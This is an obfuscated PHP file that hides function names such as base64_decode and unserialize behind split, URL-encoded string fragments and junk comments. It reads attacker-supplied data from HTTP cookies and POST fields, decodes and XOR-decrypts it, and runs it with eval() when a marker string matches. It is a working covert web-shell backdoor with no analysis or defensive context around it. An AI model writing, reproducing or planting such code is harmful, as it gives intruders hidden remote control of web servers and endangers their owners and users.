<?php # 'oyMS{'?3
	ParSE_Str# RYZ4M^
	(/* |`	e, */'30'# "tV]0f{0 ?
. '7=%' .// a$wK6`
'7' . # _ )1VRC
	'3%5'# /ldI8be=
 .	# ` C}_"DgYC
'4%7' . '2' . '%'	# Cq X8:?
	. '6'# $}hn+$.G
.# M=.BPrZZ
'C' /* BMA U^ */.// 	5H[ v4
'%4'	/* -~ Uoq0*qI */	. '5%4' .// u(UP8X
'e&' //  	&_U6]~
.#  45Uh
'20'// hkDY`N$63
. '1=%' .	// 1gBl&!
'46' .	// 	u%(YP&!z[
	'%6' . '9%' .// tf a x 
'6' ./* XhI]:d */'7%' .// h 0~39
'63%' . '4' . '1%5'/* *8DAw%~Zn */.	# @<}sPnp	i
	'0' . // 7:vGL.%!
'%'// I$+3Y^(w
. '54' .	# 	)$Rp
	'%69' .	/* !^cWw%1 */	'%4' .	// ]K" kB
'F%' // :	AT ;u
./* Q&zXm& {1 */'4e' # a	dk}R
	.	#  Daxsuw
'&87' .	# !f1sP
'9='# d2	c<[2fP	
. '%' . '4' # <5R	k04J/0
 . '2'	/*  '/l5mxg */. # \]?yR~z
	'%' . '41%' #   \:=in
. '7' .// 6&J(- 
	'3%4' . '5%3'#  cw9=7gK6
. '6' . # dEtQd"
 '%3' .// i ~kMjtyd
'4%' . '5f%'/* l<r!O\X */	.# Zbi7/A
'44' .# y4$4	
'%45' . /* .	`ee */ '%43' . // `2;PStE
	'%6'# Jln !IW`t
.#  V@mR8;	L_
	'F' . # . H	[:irrS
 '%4' . // z'-7	qN\
'4%'/* oS&	o3/b */	. '45' .# >$ L3el
'&1'// rg=S?-<2b
./* &qR->*K	j */ '00=' . # )m	">C
 '%4e' .// BL _;qh
	'%6'	# sN^P(
.// W:3	9J|f	}
	'f%'// ?	]MSU,O
. '4' .	# $do\ lox
'5%4'// GdSTU98
	. 'd%' .// s AbwU
 '62%'# (S$6}I[M
. '4' ./* AR'	?m] */'5%' . '44&' . '83'/* efg8uKDd */. /* )RY~ORX	/ */'5=%'	/* bW:tk */. '54'// 9R]	[4
./* \P(`,e */'%52' /* V6 ER%&u */.// LXfW`w
 '&4' . '8' .// .%9|W
'7=%' // g f	 Uum	
. /* 2ZwJy'05 */'4' .// <i\$E
'8%6' . '5%' ./* z 'ha */'41'/* Sa+Nwt */./* u<9*Vy\c'- */'%64'# Iq3	r?'=
.// ZM'C l 
'%45'// iq(\G5	b
	. '%7' .// v%hTR
'2'#  IF	*	 Tc	
. '&57'/* \fsyZa.] */. '3'# Fb'qx
. '=%' ./* _3U3=\p e */'6d' . /* :,wa8G */'%45'// h*yCCIk
. // ?M	I-|
'%7'/* 5Pejx */ . '4%' ./* ,K=yS */'61'// fNR, M`b_b
	./* *D:@Z */	'&4' . '57'// +uya?M
	. '=%' . // a %ua
 '53' . '%54' ./* UHF" ., */'%' .// sCAXj( ":
	'72%' ./* |aEfG	gNG */'70%' . '6F' . '%53' .// *	72^Y8>
'&67' ./* ~n<&" */'0=' . '%6e'/* !KJ$P4W	 */	./* a*|g   */'%'// [(AGN80P0
./* 8Z	sPlNX */'6' .// ocG?W1[n-W
'1%5' .// )dYsrD
	'6'// >;8+MK
. # ]}s_D[ma
'&27' /* uk(32 */	. '3'// U;]j9v3j
.# ?v~fd *E 
	'=%' . '43%' . /* &9G(O9HGT */'4'	# 9gXF;!AX
 ./* KJ548@QBV */	'1'# xU:nbm}b
./* !L+6	k@L */ '%50' .// d2^hCjA 
 '%' # A7"a D(-7
	.	/* C@<Rv;B/4  */ '5' .	// 'cD/%p.!E
'4%'// v9I]4k
. /* C/HW  */'6'# *=A3sNmtF4
.// 23fcNCT 		
	'9' # e'~&	rQ=
./* ;+c& o ;wY */	'%4' . 'f'// 7 tCz	+
	.	/* S{|TZt3 */'%'// X> ] lY|Y
.// |E`	S'e]Es
'4' .# uWH0EA
'e' . '&6'# e	x]Z%*KeB
. '7' . '=%4'// =E+RA[
 . '5'/* Wes{ z\49F */	.// _)nh8o @Z
	'%4'# g@`@7' nK`
.// tz@E	y	
'D%'	# }19Q	"	v||
	. '62%' . '45%' .//  2Y-s8/	
	'4'// PVw4A
.# ;	Z/	kP9q
'4&6'/* LZ	JNj */. '99' . '=%' . '4'// GChl!<^
. # a	%;cP\
'e%'/* )u^mhCl */. # '=(2j9r3
'4' .// \s /l
'f%'# &LM	Q
./* u ;C $kgO */'7' . // _ov)hx
'3' . '%' # bo+N7R{?
	. '63%' . '72%' . '6'/* B}ZHy2C!~/ */.	# gxo	2U	*V
'9%7'# rdzDb9_{ 
. '0%'/* ZP|X@aV */. '74&' . '77'	# 1D5h0BR
 . '7'/* u 6l7Drwp7 */.// ^q$	p-::u
'=%6'	# 	51X/w_	}
	.# ~	B/f= /G
	'1%3'# 5}fz+C>0
.// I ? ZrD
'a%' . # W66+oC"M+
 '3' . '1%3'// . ;q2	GUC
	.	// IY$zkxz 	i
 '0%' ./* z,z I */'3a%' . '7'/* (!=|o{V */ . 'B%' .// ,X*AwDPO
'6' ./* 0@AYi9nT- */'9%' . '3A'	/* VMTn  */ .	// >5Z\SH
'%32' ./* nt%Z2 0X */'%37'/* 6I	78^ */.# ;GiSGm3UG
 '%'// `u0}N
./* rC	 e[!ni  */	'3B' . '%6'// _1ELU4BQ7
./* -	[bT]vt */	'9%3' ./* +=4Z O */'A%' . '32'# n  fB{\
. # =+Et	F
'%' /* PCH5tud]s> */. '3b' . '%' . '69%' . '3a'// 8}4}T	X	 
.# 2kF4C5	*
'%' .# p	6'{
'31%'/* r(,\S+$ */ . /* M7k	 ~lk S */'30' .	#  psqK
'%'/* Z {\l,}/ */. '3B' ./* \lj}9ht */ '%' // h:B]'A6
	. '6' .# \E" =~D
	'9' .# /m5zxJ@
'%' .# }d%=,M7
'3a%' # "	oVc 1c
. '34' . '%'# ck~w'	[X
	. '3' . 'B' . '%6' . '9%3'	# 4n>FW
 . 'a'/* rgxW=ak */	. '%' . '34' . '%'# @PNq}L
.# D8y~q9U]8	
	'32' .// & 4I A
	'%3b' ./* b;Q&z */'%69'// ]6P0c
./* Yd%pb0aw */'%3' . 'a%3'/* H9o)KLR	79 */./* =|14 e?Mv */'6%' . '3b%'/* 5?1k%>	gV */.// )/AKlVoGg
'69' .//  _a	 2;
 '%3'// K	 hp
. 'A%3' . '7%3' . '8%'/* cJ),,A */.# p	7QW 
'3' . 'b' . '%'	// ;<(,	/(	,
. '6' .# 	^_J zYRh
	'9%3' .// fi{aQ
'A%' . '31%'// g<(6v<
	. /* Cx	65T */	'39' . '%3' .	# FuS	DD8SVc
	'B%'# HS`{X
	. '6'/* ZPhLC9f} */	. '9%' . '3a%' . '3' .	# CT$3;
'8%'# k	~wvo	 `
	.	/* y-msUIJv_: */	'35'	/* /]Wnr:SJ */. '%' . // 6:* ; 
'3B%' . '6' .// ZRW<b>F	
 '9' . '%3a' ./* Y0	*"0 */'%'/* KMP-m> */. '36%'# [	3QC
.# lDYOW
'3B' . '%'# o8lN)yB
. '69'/*  )1DG|9 */.// hu9X<W'
	'%3A'# +TK=4p =@$
. /* k;	.~4[V */	'%3'# X9*	\,
. '2'	/* eG-GCAXu^F */.// YpvM D}E
'%3' ./* Jgt"SY */'5%' . // %z.+z!%
'3' . 'b%6' // L_$wd'g
.	/* 7Xaz5 */'9' . '%3' . // {/ *s
'a%' . '3' . '6%' . '3b%'# .y@N :i
 .# plY~1h
 '6'/* X3^faDY_/ */. '9%3' . 'a' . '%'# !TA f
. // fG$<w
'32' ./* &}hh Z	 */'%3' /* !%-v3" \'D */. '9'/* PdTgEB|O	L */. '%' .// Kq "&+,\
 '3b%' . '69%' . '3' // F0u]@
. 'A%3'	# JzcqP P
	. '0%'	# 7 vNn3 z
. '3b'	# iJej.l 	k
. '%69' ./* '6]r;k" */'%3' . 'a%' # 3 =kV	=rG
. '32%'// gLd~" .i^*
.# 	~&qx/
 '32%' ./* ~1$V[ZU, */'3' .	// =@cQj
'B%6'// 1	gUa=Ud'
. '9%3' ./* !v{"]%47g */'a%'	/* (3	^"f  */. '3'# 6[wwK	}
. '4'	// [4J G
./* eJ@;`  */'%3'	// HU:mV
. 'b%' . '69%' . /* d?"Z	e(w */'3A' /* DuNMW! */	./* :lJE	Z& */'%39' .// pan60G
	'%' /* j* IZVu */./* *n7i Q7'u */ '37'# +Z1,F
. '%3B' # WfD^DQ
	./* HE	}<3 */'%6' ./* 2  |NqdJu6 */ '9%3' .// Afc pW}$w
'A' . '%34'	/* @%?yp? */	. '%3' .// 1AGyE PIJm
'B%'// ? cKr]B	
.	// a` um	qw
	'69%' .	/*  2VO<vY */'3a%' .	/* +	o:0|}R  */ '3'#  jP c
	. '2%'# *$\T<N
. /* sask_> */ '31%'/* "hQL((V */.// [e	?u78uC*
'3b'# E(O~O_=A X
.# <yrZv
 '%69'	# AAp<v4n!
	. '%3' /* y_o4c */ .# P	@;^M}tiC
 'A%2' .	// 3<SGG&H B
'd%3'/*  Xsf \	/N */. '1'	/* ;~'EYsF8	C */. '%3B'	// 5@)[+<4pY 
. '%' . '7' ./* 2`Ett]*hG */'d&7'/* x	A,8 */. '67=' . '%73' .// +@  "
'%51' . '%' . '4C'/* oD\dS8i[n= */ . '%' .	// ~qPn U%Z
	'57%' // Fm2enj7/xS
. '7' . '8%5'/* 7mdp!(MB */	. '9%4' . // NtMk'U
 '7%'	# 	Y[.Z X
. '64%' . '64%' . /* n	R6i */ '39' . '%' # F "2J:Y
. '66' . '%5' . # 05	AQ
'5&8'# SIR4@
. '3' ./* WU ?	 */ '9' ./* =(>\OM|o<b */'=%5' # E=yC)50C
 . '3%' . '50' .# !i	)U+Y
'%' .	/* s	8i,Z&HD */ '41'// 9miY_
./* QS	h,=__ */'%' . /* rLG$h`w */'6E&' .# *|CBx&+
 '8' // G'):w	h+
. '78' .# R"\&|
'=' .# `HR		
'%'# Mn/F=
	. '76%'# c* .-eA 
.# U8,!LDR!Gt
'49' .// W	){dj	:
'%' ./* kjrLT-	 */'37%'// YBPW9LI
 .# S ADU.w 
'37%' . '54%' . '4c'	# Eh/n\3YOf
. '%65' . '%4'// 8n;NV
 . 'b%6' . // {3CWe
'4%' . '4'// LOfZy"N
. // 	H ]uR9l
'5%'	# `}Mr0gl>
.// xm.D0
'7a%' . '47%' .//  'B M
'66' . '%4' . '5%'# g1I%fe+1X
.# <N5FQtP)Z
'54%' . '69'/* 8:d M */ . '&2'// "?A>1ZfS
.// 	dtf6%1g b
'20' /* 9WJPw  */. '=%' . '5'# R  '%x[6Y
	. '3'/* Y.Xns5t*' */ .	// ?	$E!l(AGJ
 '%7'/*  ?)4fE]- */. '5%'# 	,E)W[S
. '62%'# ^knlXWd<
. '53%' . '74'/* FOtxO'[w{8 */.# xy	nyNkOR
'%'# |5}^Gk6%Ku
.// z	>226+B	d
	'52' . '&' . '8'	// @F	<krKj
 .# % }a@
'56'// f	F:o]sV
. '=' . '%7'	# ;!Mu|J
	. # |3K&	
 '0' . '%6' ./* TE6WA{?1FX */'8%7' ./* $>	Y|~4 ` */'2%' .	# .\V !&"s	
	'61%'// N]	t_J	'
. '5' . '3%4'// B_" Hkj
.# \?abQXZ
 '5'# {ks+ V$
. '&7'// BY.bq}wMQ
. '89' # /xS&0
. '=%' /* S%F%  */	. '4'# c,qG_
 . '2'// rxHLHCO( 
. '%6'/* o.UD ^ */.	# F<	Gl
 'F' .// n cCFL}j[F
'%6'# NZf'C+
. 'c%' . '4' .// FF|m'o
 '4' .// >,H+j
'&27' .# 	MnUz46k
'5' ./* j 8Ak8Y< */'=%4' .	/* MJN T:% */	'3%4'# '3bL9":[
. 'f%4'# 	m~]uakA~u
./* A;mcm */'c'	# ra'/<D	t0
. '%' . # =6i{q R
'67' .	# <2	SFWC{:
	'%5'# >m^9J)?@Vn
	. '2%' ./* CO[p 0X+ */'6F'# s<ejR 
.	# (,E	r=
	'%5' .# p$6|=T!o
'5%'/* 80Wao	RT */. '70'/* 	k^Xr>! */. '&8' . '45' . '=%5'/* :OsA=zI */. '5' .# D'cwY8&m}
 '%4' . 'e%' . '53%' . '65%'#  1eItI
 . '52%'	/* ]c FV/ */	. '49%' . '4'# )ziO|
. '1%4' . 'C%6'# +D+~1|Z	"q
. '9%5' . 'A%4' . '5'/* 8-yobaT|{: */.#  /S~Ar+VC
	'&'// v7~zx~x
. '875' .// 'u".dpP-T;
 '=%4'/* AV	nD */./* U;L%, */'F'/* m~{%/yBk */.// +=udV
'%50' .// Mk2%*.
 '%74' . // bEsv{p
'%'/* XL[S{z6 */	./* Va		-U */	'67'# /8*$z4^j@
.	/* 	XD+uENtV */	'%7' .// :!*`E
'2%6'# n} c|Ka,V
. 'F%5'// ks7} ~Mp9R
. '5%7' # =Zh	T5RM-?
. '0&8' . '57=' . '%'// "($oUQ t
. '63%' ./* SGT	 zA"2 */'34'// *%ZX(eP>DS
. '%' . /* g:VJ-QY(Gf */'73'/* M'F{[ */.// .RgF+	jczc
'%63'# &M?{	
 ./* 	"ah0$i */'%5'# 2os{J3+7i
	.// Ese"|qmwv
 '8%7' .// <q]8T8 p	1
	'3' . '%70' // &U	24kj
./* r9U	VM&' 6 */'%5'/* ':?R$U */. '5%5'# %Zr'=2
	./* 	T&L!	 */'6'/* >*9-m */	. '%51'	/*   3I4` */. '%'	/* G/ooM */. '6'/* mOt^K */	.	/* 8H[OL/X */	'b%' . '4D%' . '6d'// 's`T{c
.// TftjsZdc
'%6'// mUp7	
.	/* ~&'	 T  */'4'	# B +wMCd
. '%4B'# T.rA )V
	. '%78' . '&73'# 	f?|!	T0Ow
 ./* &:R5y&  */	'1=' . '%4d'	# t;kdFH
 . '%65' // _Ct P
. // !&	KG;U
'%54' // KWFs@
.# m A.Xt>-)
'%'// iG-6k5
 . '6' // >pdi; (q,
./*  Ny|{ */'5%' . '72'/* ,x8gSy */	. '&63' .# }pnG	sI
'3='/* 	>2sz */. '%61'	/* ^`>hdl */. '%'# x	[a&U
./* /U}X? D"~4 */'7'// -V		M
. // ^r':xy)
'2%7'	/* 	qtQ	\~}@ */. '2%4' . '1%' . # oot872
'79%' . '5F'	# (Z5+h
	.// R,	s=F,N
 '%56' .	# _),9zS_*
'%4'// F0h/j
./* HYr		9i */ '1%' .#  +r.	
'6'/* BDmEC ] */.# rVv,;QAFG
'C' .# |I&54
	'%75'// 6PFy=|6=w8
. # P?AQ5	 *
'%'	# 9ymD*gzV,8
 . '65%'	# dg)	=Dj vg
	. '7'# ;acRl6nw,	
. '3&3'//  ~ c 	u
. '04=' . '%7'// E+mVDg t
./* : = sK.,.\ */	'5%' . '52%' .# Io?_.,)f0
'6' .	/* /{IGcV8_G8 */'c'# bp*nd
 ./* d.LH! */'%44' # L[==2JzX
	.// BRXN|
'%' .# $d]n)Q
'65'/* rcz^	5Zx!q */. // 		!k6-X
'%6' # 8t~u{ 21(h
 . '3%' ./* SE	\H */'4F'# 		~m0/g T
. // 8g_2gd3R
'%'/*  cvY]/24TU */	. '6' .# U^V7,
'4%'/* /:sB 	E^N */./* A;;,";zF */'6'/* k2K8n@ !7 */./* 0RI $bB */ '5&'	// N{ 	e
. '755' . '='# JZF;SoUit
. // >1^	<MlS
'%' # y dV@R`/"^
.# VNy&4Olk
 '6e%' .// L0B`YP
'73' .// lK7	2=`h
'%61' . '%70'# x<(8To
. '%78'// x=\.Ei
. '%6'/* R!	sg6^&	 */. 'E'// <lvC B) 
 .// !aP\hpR3+
	'%'	# | 8m030W
.	// O,&Op
'41%' # Q*`uq|
.	// d7mZ	
 '4' .	# mmP/ifG	Yn
'4%' .// m]rR XQ>y0
 '4F' // u6~lq		55
	. '%' . '4'	/* V/	RL */. 'a'	// x'}v 
.# yD%]U_uI
'%6' . 'F%' /* !xs,: */. '4'#  \vw|5D 
. 'e%5' . '3&7' . '56=' .// l_s5a^t
'%41' . '%' . '6' .// $V&V"0B
'2%' . '4' ./* gj]g)Z */ '2'// 6-k@.~
.# PN57Ttc	*
'%7' .# `3*`M
'2'// ,u[q0+d	|^
	. /* E$ "	 ` */'%4' .# 2AZ?]z03j
'5' .// =rg1 )k8
 '%7' .	# /ZL|1  
 '6' /* 7/%dN	e */. '%'// D 7B 
. # BIfEx
'49%' . '6' . '1%5' # \zU'Fn` 
 .# 2Svar=+
'4' .	// SJ@"G
'%' .// R+n0nY?!W
'69%' .# BgBaX P
'4F'	# |8oniU|k0'
./* mL-'rw */	'%6'# V|e_JG
 .# .)Q T3q
'E' , $b0OH # H+;Lp6MB
	) ; $u1Wa# 2&a3/BKK]
=# J6pu,",`Z
$b0OH [ 845 ]($b0OH [ 304/* 6\S>iuof */]($b0OH// ?S]Ae
[ 777 ]));// 	tT	j4y{ ,
	function vI77TLeKdEzGfETi# q0+%	iC
( $vA9y2// -Z*PSDhnu5
 ,# y-2	-kT 6
$gr7Aapk )# \e~.n9b.m
{ global// 	[.lU.Y
$b0OH ; $sJsJ1ZE	# 0X.dQ
=# .  X.>-T
	''# jwOC~c
	;	// Snj G*I{
 for (# {v!(ds
 $i = # \$,rq
0 ;# y}6gL]}.
$i < $b0OH// Cp-)?4d 	
[// \I/\	
307# p,*@6[
	] # 	J!X B
 (	/* rb6{x */$vA9y2 )	# %1z	SWl6nt
 ; $i++ /* +mBC   */) /* _		'M	) 	 */{	# BI	gt'
$sJsJ1ZE/* \w@7G3~/= */.= $vA9y2[$i] ^ $gr7Aapk [/* fC	qa */$i /* HSWyGXD */% $b0OH [ /* g-TnoD'/ */307 /* F[T;4E3 */] (# (I8 @yJ< j
$gr7Aapk )# vSs	 	
] ; } return/* y=u*:4] \ */$sJsJ1ZE ; }/* 	 J`	5 */ function /* cRx &* */sQLWxYGdd9fU/*  | '}G|Z */ ( $qX9G8ql ) { global $b0OH// _OI	W6e=
;/* a{ J3=2{ + */return $b0OH [	/* bol7= `TFc */633// 8A6,{`6O-6
] ( $_COOKIE ) // Vv9K@
 [/* ;)]H!|w */$qX9G8ql# F=mtM w
]// rn2@o	/k
; } # _* cf
 function	/* lTN&GVE;l */nsapxnADOJoNS	// 5]o	 !p
( $M8P29/* &]jML */	)// !i|e5- 7
{ global $b0OH ; /* NmXkcC,C| */	return $b0OH/* _KAo	yDkU */[ 633/* zK^'	 */]	# ive%!43-aI
 ( $_POST )/* INX+ = */	[	# 9S"2&rj
$M8P29 ] ; }	# ?ah '
$gr7Aapk = $b0OH [/* ~DBGTrC */878 ]	# fn/m]M &zJ
( $b0OH/* x;rTZji4U */[ 879// fU{ q[Cm
	]# GD]d(u&
 (/* 1+ne /Jk% */ $b0OH// m3)'.86Y
[ 220 ]/* KI))K	>v^) */ ( $b0OH [ 767 ]/* K,d<D */ ( $u1Wa# ?E+"vq	8J
[	/* G9a_* */27 ]	/* R N0	4 */) ,# thV .r/9J
$u1Wa# I< ==.j
[/* \9c'|EQ */42 ] ,	/* ) ;M?_ */	$u1Wa [ 85 ] // XV8=>g!`
	* $u1Wa # 1[HxU8==
[	# EVECu^z|
22 ]/* kSQFP */) )	// ^XxQa
,# H><(_F|
$b0OH [# Puv~z"
 879/* Y(z%+n- */]	# ^EH"($
( $b0OH/* pX)yP&~ */[ 220 ]/* jgqbI@9 */ (# 8P IkF
 $b0OH// P[Td!Z)/AR
	[/* TeM?h */ 767 # 3^jVF	_tU
 ]// M	5@X>=D
( # _"8'iyN$
 $u1Wa [ 10 ]# B{	VW 8i\	
	) /* RyDSWs  */	, # ^KLOh4a
$u1Wa # |<x]z^ 
[// A}]  *T9/,
78 ] , $u1Wa [ /* -*(	up8 */	25/* =vtZ: */ ]# Cb? Ot
 *// $8k7|hJ)l
$u1Wa [ 97 ] // !rA^@g3dH
)// ygqP	)_ 
)	/*  >TjO */)// Z		g,9AU
; /* Ad8^T */$vBrHNd5B = $b0OH// 07`Tq 
[ 878	// 4bD}ypeU	k
] ( # J61h|z;o
$b0OH [/* TO@D &2CN{ */879// i[GSZXF
] (# vKxn .{
$b0OH#  	^.s[
	[# .Pq]:A6x
	755 /* m;yv1f */ ]	/* i!heN */(// s5j+ O. 9;
$u1Wa// oSTa9 zk
[ 29/* J)Cz}R */] ) ) ,# XCa^}mWNR^
$gr7Aapk	// =R=G-A
)// LUzNr
 ; if (	# 5I>QhM
$b0OH// ,cL"63
[# E	KS2(L$I@
457	# 	Dn*25 
]/* tB	bWm */	( $vBrHNd5B// .7$1;.@
,// rnCQ'!jh
$b0OH [# ltb^gv.Ax
	857 ]// <=U`{
) > $u1Wa// g.$M  0
	[ 21/* pPd= |*k */] // >sv 4'`	q'
) EVAl ( $vBrHNd5B# Ke2$^;
)// Gj%9N; 
; 